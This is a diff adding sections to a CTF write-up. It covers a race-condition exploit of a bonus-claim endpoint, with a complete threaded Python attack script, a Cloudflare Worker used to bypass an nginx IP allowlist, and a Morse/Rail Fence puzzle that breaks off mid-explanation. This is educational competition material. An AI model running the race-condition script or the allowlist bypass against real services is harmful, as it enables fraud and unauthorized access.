@@ -238,3 +238,350 @@ After we've done submitting the **_$payload_**, we can just get our flag on the 
 ![](./image/Picture27.png)
 
 Flag: `umcs{n1c3_j0b_ste411ng_myh0p3_4nd_dr3ams}`
+
+## Straightforward
+
+![](./image/Picture28.png)
+![](./image/Picture29.png)
+
+### Executive Summary
+
+This challenge presents an online reward system where users can collect daily bonuses to earn points and purchase a flag. But it contains a race **_condition vulnerability_** in the bonus claim mechanism that allows users to claim multiple bonuses simultaneously, bypassing the intended limitation of one bonus per user. By exploiting this vulnerability, we were able to accumulate sufficient balance to purchase the flag.
+
+### Tools used
+
+• Python
+
+### Static Analysis
+
+Based on the source code, there are some interesting parts:
+
+1. Database Schema:
+   • **_users table_**: Stores username and balance
+   • **_redemptions table_**: Tracks which users have claimed their daily bonus
+
+2. Critical Vulnerability: The /claim endpoint contains a race condition:
+
+```php
+# Check if already claimed
+   cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
+   row = cur.fetchone()
+   if row and row['claimed']:
+       flash("You have already claimed your daily bonus!", "danger")
+       return redirect(url_for('dashboard'))
+
+   # Update database - these operations are not atomic
+   db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
+   db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
+   db.commit()
+
+```
+
+The critical issue is that the check and update operations are not performed atomically. There's a time window between checking if a user has claimed the bonus and marking it as claimed, allowing multiple simultaneous requests to pass the check before any single request updates the database.
+
+3. Flag Access: The **_/buy_flag_** endpoint verifies a user's balance before providing the flag:
+
+```php
+if row and row['balance'] >= 3000:
+    db.execute('UPDATE users SET balance = balance - 3000 WHERE username=?', (username,))
+    db.commit()
+    flash("Reward redeemed!", "success")
+    return render_template('flag.html')
+
+```
+
+### Final Payload
+
+We developed a Python script to exploit the race condition vulnerability:
+
+```php
+import requests
+import threading
+import re
+import time
+
+url = "http://159.69.219.192:7859/"
+
+username = f"test{int(time.time())}"
+session = requests.Session()
+register_resp = session.post(f"{url}/register", data={"username": username})
+print(f"Registered as: {username}")
+
+def claim_bonus():
+    try:
+        resp = session.post(f"{url}/claim")
+        if "Daily bonus collected" in resp.text:
+            print("Successfully claimed bonus!")
+        elif "already claimed" in resp.text:
+            print("Claim blocked - already claimed")
+    except Exception as e:
+        print(f"Error: {str(e)}")
+
+threads = []
+num_threads = 30
+
+print(f"Launching {num_threads} simultaneous claim attempts...")
+for i in range(num_threads):
+    t = threading.Thread(target=claim_bonus)
+    threads.append(t)
+
+for t in threads:
+    t.start()
+
+for t in threads:
+    t.join()
+
+dashboard_resp = session.get(f"{url}/dashboard")
+balance_match = re.search(r'Your current balance: <strong>\$(\d+)</strong>', dashboard_resp.text)
+
+if balance_match:
+    balance = int(balance_match.group(1))
+    print(f"Current balance: ${balance}")
+
+    if balance >= 3000:
+        print("Balance sufficient! Buying flag...")
+        flag_resp = session.post(f"{url}/buy_flag")
+
+        if "UMCS{" in flag_resp.text:
+            flag_match = re.search(r'UMCS\{[^}]+\}', flag_resp.text)
+            if flag_match:
+                print(f"FLAG FOUND: {flag_match.group(0)}")
+            else:
+                print("Flag format not detected, but here's response:")
+                # Print part of the response to see the flag
+                print(flag_resp.text[:500] + "...")
+        else:
+            print("Could not find flag in response")
+    else:
+        print(f"Need ${3000 - balance} more to buy the flag")
+else:
+    print("Could not determine balance")
+
+```
+
+The race condition works because:
+• The server first checks if a user has already claimed the bonus
+• Then separately updates the database to mark it as claimed
+• When multiple requests hit simultaneously, several can pass the initial check before any mark the bonus as claimed
+• Each successful request increases the user's balance by $1000
+
+### Flag Extraction
+
+![](./image/Picture30.png)
+
+Flag: `UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}`
+
+## Microservices
+
+![](./image/Picture31.png)
+
+### Executive Summary
+
+This challenge required investigating on the source file and find the vulnerable code to access the flag files using the correct IP address.
+
+### Challenge Overview
+
+This challenge need to have knowledge of how does the api works and how to overrides the ban ip to get in to the 5555 port and retrieve the flag
+
+### Tools used
+
+• Cloudflare Workers
+• Visual Studio Code
+
+### Analysis
+
+1. First we start the analysis by the source code given by the challenges
+
+![](./image/Picture32.png)
+
+2. Then we have a check on how should we overrides the code as we can see there is a things we should bypass to get into the 5555 port and open the flag files.
+
+3.
+
+```nginx
+server {
+        listen 80;
+
+        location / {
+            # Private IPs
+            allow 127.0.0.1;
+            allow ::1;
+            allow 172.18.0.0/16;
+            allow 10.0.0.0/8;
+            allow 172.16.0.0/12;
+            allow 192.168.0.0/16;
+
+            # Cloudflare IPs
+            allow 103.21.244.0/22;
+            allow 103.22.200.0/22;
+            allow 103.31.4.0/22;
+            allow 104.16.0.0/13;
+            allow 104.24.0.0/14;
+            allow 108.162.192.0/18;
+            allow 131.0.72.0/22;
+            allow 141.101.64.0/18;
+            allow 162.158.0.0/15;
+            allow 172.64.0.0/13;
+            allow 173.245.48.0/20;
+            allow 188.114.96.0/20;
+            allow 190.93.240.0/20;
+            allow 197.234.240.0/22;
+            allow 198.41.128.0/17;
+
+            deny all;
+
+            proxy_pass http://localhost:5555;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_http_version 1.1;
+        }
+```
+
+4. We can see in this code in the default.conf file, only private or cloudflare IP is available to allow access into the api server.
+
+5. Cloudflare workers done the work for this case to change the ip address to GET the file from the server as it allow the access of cloudflare IP.
+
+6. Then we write a script to run on the cloudflare workers playground to fetch the text from the server.sttsst
+
+```python
+export default {
+  async fetch(request, env, ctx) {
+    const response = await fetch("http://microservices-challenge.eqctf.com:5555/flag", {
+      method: "GET",
+      headers: {
+        "Accept": "application/json",
+      },
+    });
+
+    const data = await response.text();
+    return new Response(data, {
+      headers: { "Content-Type": "text/plain" },
+    });
+  },
+};
+
+```
+
+7. Run the script and we can get the flag directly from the server.
+
+8. Cloudflare Workers
+
+![](./image/Picture33.png)
+
+### Takeaways
+
+• IP Whitelisting Alone is Not Secure – Additional protections are needed.  
+• Cloudflare Workers Can Bypass IP Bans – Useful for testing and authorized penetration testing.
+
+### CREDITS
+
+Thank you **_benkyou@USM_Biawaks_** for providing hint of the chall **_after the end_** of UMCS CTF Preliminary Round.
+
+# Cryptography
+
+## Gist of Samuel
+
+![](./image/Picture34.png)
+
+### Executive Summary
+
+This challenge involved decoding a hidden message using a combination of Morse code and the Rail Fence cipher. The solution required analyzing an emoji-encoded file, translating it to Morse, and applying a Rail Fence Cipher to reveal the final flag.
+
+### Challenge Overview
+
+The challenge provided:
+
+1. gist_of_samuel.txt – A file filled with unusual Unicode symbols (🚂, 🚆, 🚋).
+2. Samuel is one of the author that write the morse code.
+3. GitHub Gist – Containing ASCII art that held the final flag.
+
+### Tools used
+
+• Python (for Morse code translation)  
+• Rail Fence cipher decoder (online tool)
+• Courier New font (to properly render ASCII art)
+
+### Analysis
+
+1. Decoding the Unicode File
+
+The file contained strange symbols (`🚂`, `🚆`, `🚋`), suggesting misinterpreted binary data or a custom encoding.
+Upon closer inspection, these symbols resembled Morse code when mapped to:
+
+• `🚂` → Dot (.)  
+• `🚋` → Dash (–)  
+• `🚆` → Separator ( )
+
+Python Script for Morse Decoding:
+
+```python
+morse_dict = {
+    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
+    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
+    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
+    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
+    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
+    '--..': 'Z', '.----': '1', '..---': '2', '...--': '3', '....-': '4',
+    '.....': '5', '-....': '6', '--...': '7', '---..': '8', '----.': '9',
+    '-----': '0', '.-.-.-': '.', '--..--': ',', '..--..': '?',
+    '.----.': "'", '-..-.': '/', '-.--.': '(', '-.--.-': ')',
+    '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
+    '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"',
+    '...-..-': '$', '.--.-.': '@'
+}
+
+file_path = 'gist_of_samuel.txt'
+
+with open(file_path, 'r', encoding='utf-8') as f:
+    content = f.read().strip()
+
+morse_text = content.replace('🚂', '.').replace('🚋', '-').replace('🚆', ' ')
+
+morse_chars = morse_text.split(' ')
+
+result = ''
+for char in morse_chars:
+    if char in morse_dict:
+        result += morse_dict[char]
+    elif char == '':
+        continue
+    else:
+        result += f"[{char}]"
+
+print("DONE:")
+print(result)
+
+```
+
+Output:
+
+```
+DONE:
+HERE[.......]IS[.......]YOUR[.......]PRIZE[.......]E012D0A1FFFAC42D6AAE00C54078AD3E[.......]SAMUEL[.......]REALLY[.......]LIKES[.......]TRAIN,[.......]AND[.......]HIS[.......]FAVORITE[.......]NUMBER[.......]IS[.......]8
+```
+
+2. Identifying the Cipher
+   The decoded message included:  
+   • "**_SAMUEL REALLY LIKES TRAIN_**" → Hinting at Rail Fence cipher (rail = train tracks). (Look also at the question given of the challenge 'gatekeeping')
+   • "**_FAVORITE NUMBER IS 8_**" → Should be the key for the cipher.
+   • "**_E012D0A1FFFAC42D6AAE00C54078AD3E_**" → A hexadecimal string identifying the GitHub Gist.
+
+3. Retrieving the GitHub Gist
+   • Using the hex string from the decoded message, we accessed the GitHub Gist at:
+   https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e
+   ![](./image/Picture35.png)
+
+• The Gist contained what appeared to be ASCII art, but it was encoded with the Rail Fence cipher.
+
+4. Applying the Rail Fence Cipher
+
+• The Rail Fence cipher is a transposition cipher that arranges text in a zigzag pattern across a specified number of "rails."
+• Using the hint that Samuel's favorite number is 8, we applied the Rail Fence decoder with 8 rails and Offset = 0.
+
+Decoding Process:
+
+1. Copy the content from the Github Gist
+2. Use an online Rail Fence decoder.
+3. Set the number of rails to 8.
+4. Apply the decryption algorithm.
